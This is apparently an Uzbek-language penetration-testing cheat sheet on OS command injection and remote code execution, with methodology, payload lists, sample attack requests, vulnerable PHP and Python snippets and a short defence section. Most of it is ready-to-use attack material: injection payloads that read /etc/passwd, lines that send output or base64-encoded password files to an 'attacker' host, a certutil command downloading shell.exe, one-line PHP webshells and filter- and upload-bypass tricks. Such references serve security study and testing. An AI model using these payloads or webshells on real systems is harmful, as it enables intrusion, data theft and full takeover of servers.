# RCE + Command Injection

## 1. Ta'rif
Command Injection — OS command'ga input qo'shilib, attacker qo'shimcha command ishga tushirsa. RCE — allow: file upload (webshell), deserialization, templates, etc dan full code/native execution. Bu ikkalasi eng yuqori impact.

## 2. Qayerdan kelib chiqadi
- `system()`, `exec()`, `passthru()`, `shell_exec()`, `` ` `` backtick, `popen()` (PHP)
- `subprocess`, `os.system`, `os.popen` (Python); `Runtime.exec`, `ProcessBuilder` (Java); `.NET Process.Start`
- Ping/IP/domain/mac check, DNS lookup, "convert", "parse submit", image magick
- Cron/task input, email sending (sendmail), SSH/GIT commands
- RCE orqali: file upload webshell, deserialization gadget, SSTI RCE, unsafe pickle/yaml.load, image magick (ImageTragick), log poisoning + LFI

## 3. Turlari
| Tur | Tavsif |
|-----|--------|
| Command injection (aki) | OS command qo'shish |
| Code injection (eval) | PHP `eval`, Python `eval` |
| File-based RCE | webshell upload, trick extension |
| Interpreter RCE | deserialization (php unserialize, Java gadget), YAML.load, Pickle.load |
| Log poisoning → LFI → RCE | `log-poisoning/note.md`ga qarang |

## 4. Metodologiya
1. Input joyini toping (ping form, email, image name, ID bash bo'ladi).
2. Test: `;`, `&&`, `||`, `` ` `` , `$()`, `|` — hammasi va qaytishi.
   ```bash
   id;  ls;   && whoami   || whoami   `id`   $(id)
   ```
3. Echo'ni isbot: `; echo PWNED` (`PWNED` output'da bo'lsa).
4. Blind bo'lsa (noutput): 
   - `; sleep 5`
   - `; curl http://attacker/c?x=$(whoami)`
5. Payload URL-encode, newline `%0a`, space o'rniga tab, `${IFS}`, `${PATH%??}`.
6. Filtr bypass: `/` → `$(echo ${PATH%???})`, `$(expr substr...)`, base64 decode.
7. RCE turlari bo'yicha:
   - File upload → `shell.php`, `.phtml`, trick.
   - Deserialization → ysoserial (Java), phpggc, pickle.
   - SSTI → `{{7*7}}` → RCE ga o'tish.
   - ImageMagick → ImageTragick payload.
8. Database RCE: MSSQL `xp_cmdshell`, MySQL `INTO OUTFILE`, PostgreSQL `COPY`.

## 5. Payload'lar
```
# Command injection
; ls
;id
&& whoami
|| whoami
| cat /etc/passwd
`id`
$(id)
%0aid
%0a id
;cat${IFS}/etc/passwd
;curl${IFS}attacker/c?x=$(whoami)

# Newline (filterdan o'tish)
ping -c 4 127.0.0.1\nid
127.0.0.1|id
127.0.0.1;ls%0a

# Windows
& whoami
| whoami
%0a whoami
cmd /c whoami
certutil -urlcache -split -f http://attacker/shell.exe C:\shell.exe

# PHP code injection
?cmd=phpinfo();
?code=system("id")
${eval($_GET[c])}

# Webshell minimal
<?php system($_GET['c']); ?>
<?=`$_GET[0]`?>
```

## 6. Request misollari
```
GET /ping?ip=127.0.0.1;id HTTP/1.1
Host: target.com

POST /api/convert HTTP/1.1
Host: target.com
Content-Type: application/json

{"url": "& curl http://attacker/x -d $(cat /etc/passwd | base64)"}

GET /run.php?cmd=phpinfo(); HTTP/1.1
Host: target.com

# ImageMagick
POST /convert HTTP/1.1
Content-Type: image/png
# body: MZ convert puffin:file:///etc/passwd; mimetype: (file -m zabi:...)
```

## 7. Zaif code misollari
```php
// ZAIF
system("ping -c 4 " . $_GET['ip']);
$output = shell_exec("ls -la $dir");

// Python — ZAIF
os.system("ping -c 4 " + ip)
subprocess.call("ls " + folder, shell=True)

// XAVFSIZ
// - shell=True dan qoch, list args shaklida
// - whitelist ip regex — hammasi tegishli
// PHP: escapeshellarg()/escapeshellcmd()
```

## 8. Nimalarga ahamiyat berish (checklist)
- [ ] Har bir `echo` WS `id` — output'ga kontent
- [ ] Blind — sleep/DNS callback, bitta ham isbot
- [ ] YOp: `|id` not `;id` — hamma shell metacharacters sinash
- [ ] URL encoding: `%26`, `%0a`, `%24%28`
- [ ] `-la` filtrlangan bo'lsa base64/decode
- [ ] Progamming tiliga ergashish: PHP `eval`, JS `eval/Function`, Python `eval`
- [ ] Upload'da `.php` bloklansa — `.php5 .phtml .pHp .phar .inc`, mime, magic
- [ ] Sploi ehtimoli — hamma endpoint'ga RCE convert/import/export
- [ ] Log poisoning + LFI combo — ko'p uchraydi

## 9. Himoya
- Never connect input with shell; use paramized functions / safe libs
- Whitelist (IP/domain validaion), regex strict
- `shell=True` disable, remove eval/dynamic code
- Upload: whitelist extension + serve as static + no execution directory
- Least privilege (www-data), WAF